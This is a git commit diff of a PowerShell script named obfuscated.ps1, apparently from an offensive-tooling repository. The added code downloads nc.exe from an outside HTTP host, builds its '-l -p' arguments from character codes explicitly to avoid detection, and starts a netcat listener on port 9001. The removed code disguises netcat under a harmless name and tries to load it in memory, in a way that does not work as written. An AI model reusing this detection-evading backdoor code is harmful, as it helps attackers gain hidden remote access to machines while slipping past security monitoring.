0dde27e1ea5dd52fbac0bd06c4fd5bf0a896e20f
Moe <57568144+H4shByte@users.noreply.github.com>
2023-04-28 12:33:05 -0400

    Update obfuscated.ps1

--- obfuscated.ps1
+++ obfuscated.ps1
@@ -1,29 +1,12 @@
-# Path to the zip file containing justaprogram.exe (nc.exe)
-$zipFilePath = "C:\path\to\your\justaprogram.zip"
+# Download nc.exe from the HTTP server
+$ncUrl = "http://10.5.5.5:8080/nc.exe"
+$ncFileName = "nc_obfuscated.exe"
+Invoke-WebRequest -Uri $ncUrl -OutFile $ncFileName
 
-# Path to a temporary folder for extracting justaprogram.exe (nc.exe)
-$tempExtractPath = "C:\path\to\temp\extract"
+# Obfuscate arguments to avoid detection
+$arg1 = [char]45 + [char]108
+$arg2 = [char]45 + [char]112
+$port = "9001"
 
-# Extract justaprogram.exe (nc.exe) from the zip file
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory($zipFilePath, $tempExtractPath)
-
-# Set the path to the extracted justaprogram.exe (nc.exe)
-$justAProgramPath = Join-Path $tempExtractPath "justaprogram.exe"
-
-# Read the contents of justaprogram.exe (nc.exe) and convert to base64
-$content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($justAProgramPath))
-
-# Decode base64 and load justaprogram.exe (nc.exe) in memory
-$decodedContent = [System.Convert]::FromBase64String($content)
-$exeBytes = [System.Reflection.Assembly]::Load($decodedContent)
-
-# Create a PowerShell script to execute justaprogram.exe (nc.exe) with a listener on port 9001
-$scriptContent = @"
-`$listenerPort = 9001
-`$nc = `$exeBytes.CreateInstance('Netcat')
-`$nc.Listen(`$listenerPort)
-"@
-
-# Invoke the script to start the listener
-Invoke-Expression $scriptContent
+# Run nc.exe with obfuscated arguments
+& .\$ncFileName $arg1 $arg2 $port
